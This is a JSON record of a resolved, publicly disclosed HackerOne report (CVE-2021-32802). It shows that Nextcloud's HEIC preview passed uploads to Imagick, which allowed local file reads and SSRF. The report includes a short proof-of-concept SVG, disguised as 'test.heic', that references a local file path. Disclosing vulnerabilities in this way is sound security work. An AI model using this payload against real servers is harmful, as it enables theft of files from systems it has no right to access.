@@ -1,0 +1,183 @@
+{
+  "id": 1261413,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYxNDEz",
+  "url": "https://hackerone.com/reports/1261413",
+  "title": "HEIC image preview can be used to invoke Imagick",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-07-14T13:21:35.194Z",
+  "submitted_at": "2021-07-14T13:21:35.249Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukasreschkenc",
+    "url": "/lukasreschkenc",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-32802"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-01-07T09:55:38.085Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-12-08T09:55:37.850Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The HEIC image preview provider calls into Imagick at https://github.com/nextcloud/server/blob/5d097ddb4b99673f57b8c085dedd93880ee2539d/lib/private/Preview/HEIC.php#L98-L109. This is bad as Imagick processes all kind of image types.\n\nOne can use this for example to exfiltrate arbitrary files by passing a SVG file that contains a `xlink:href` to a locally existing file. There are also other concerns with regard to SSRF and XML parsing done by Imagick.\n\nA super naive example, uploading a file such as \"test.heic\" with this content will render the file \"nextcloud20.png\" inside it. (but you can also reference PDFs, or use it for SSRF, etc etc.\n\n`test.heic`:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n   style=\"overflow: hidden; position: relative;\"\n   width=\"500\"\n   height=\"500\">\n    <image x=\"0\" y=\"0\" width=\"500\" height=\"500\" xlink:href=\"/Users/lukasreschke/Downloads/nextcloud20.png\" stroke-width=\"1\" id=\"image3204\" />\n</svg>\n```\n\nPreview:\n\n{F1376376}\n\n## Impact\n\nGaining access to arbitrary files on the system, SSRF, etc.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1376376,
+      "file_name": "Screenshot_2021-07-14_at_15.21.03.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yd142zx9bjrpnms000rjwnsktmi3?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-07-14_at_15.21.03.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-07-14_at_15.21.03.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43OBVWIG%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T135738Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCFUaZBGSF%2BnsCq5woG8a1Di7HU1r5mXpnM3P9ju%2B%2FaAQIhALGDjtaNb7dh91WXuQ2AmDxEyk8AkST36ww%2BpslsGdRUKrsFCJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxeQCZvLDlLsewYoMEqjwU7Tj1rWjKX6lYElEFjOZVCnfxNvWvMhA7vnARxoFvw1%2FJKQOvi3YThsdGAh1fKPi83vq0JQYqL9FrDU%2B0F%2BcvWppYqogLHeIvYnpH6R6lTbRwqwa7Y0pBzBHWe%2BRLGLVv0HKnXePrsTrn57Yf9JcDqB7zuXM4qcas%2BRsl3tgwMTWJT%2FEtWpMpkQvtEpfY%2F7gY9%2BlZrCdAWWH2At0xy%2FW8hO04QLSqCzyfHCrMLpRQDVaUpRXt8xwkJvC6K5pA39WxnK04c63MKz3OGTfxJWg7GCoMzLxG9pC39Dn4c36aiHUnuo2mmoQkb787NdEGjzSZE6r0DKd2Bw64RD9sVOebV4hId8838iWaKFDsnAktkZNYofhnIk86055JD%2BHBGUQc0DAab9t0BD4crCEsrB54PGYinNZbjA%2FDYSMjOBOQwyxkFQY0B3xgUc89LgQdgNPrAvooSEryTPu5xDT9s4GnyJOzLvv%2Fe9%2BDrjK1P6UNqjyGduZsUcga8ILJmI2lxJS93SChR0%2FpfyINlX9iijjf2%2BGPtkuGeUzvM%2FlFMIk0O9UqJXztKt%2F6hI4X9yZuDzHae57Vcea7aMd5IuWRumw%2FF9LJHfCvm1UMz6xOHUB5wVp%2FlmtCq5UPxES1QQOQZprqF145z3dnQ5IqY5bageJmdHfMKAotKMRoYP32Ly%2FZg9jpwsgix0JGRewrIyT0XaV%2FiwH7VjrGD9hMvFVVFAMTON%2F9ghyTiRvueyECJaA%2BQ6ZbHfjDeJE4OvrD%2B8%2BqklZDwzxaIAgmCfXX9NZmBmPrwFcHnnmFUuW%2BL7KL2CI4C6%2FW9R1v22VMChtKhJLndxSHbiY4eGfVwtku%2By6UfgIVwUd3g2EKHiwe5tTkf9Vr8MLa4ldEGOrABPlZ3DYkgzNpRpc6chq8MlOl4qQljgxb5sLF0W9akEmQJc8hYbHqgoK2i%2BD8RfXZqhiBY4YTAVnTjE6lMBq7wPVzbiZrmLq621jZ9agAcd8A4QyzZjB6vwctpw4amPC2EIYXhTlm1%2BPYE2zLI1HD%2BmyGv7iowg4KXryM3xuMgJKTo0GjWCfgR%2FWwkXPNQoMTN4n4LZcrGSi05R5DCNQyifhF%2F%2FDBfuRIwovgGT8F01Uc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d88f0e57fe0924c609506c0d0df4de8125e3680b6edb3abad9acf09c2d40278f",
+      "file_size": 557487,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-01-07T09:55:37.991Z",
+  "allow_singular_disclosure_after": -107755320.12320293,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "davwwwx",
+    "drsniper",
+    "zy9ard3",
+    "shreyaschavhan",
+    "shubham_srt",
+    "h4x0r_dz",
+    "eminfidan",
+    "shivammusic",
+    "j0hnbugdoe",
+    "qweasdzxcvbn",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
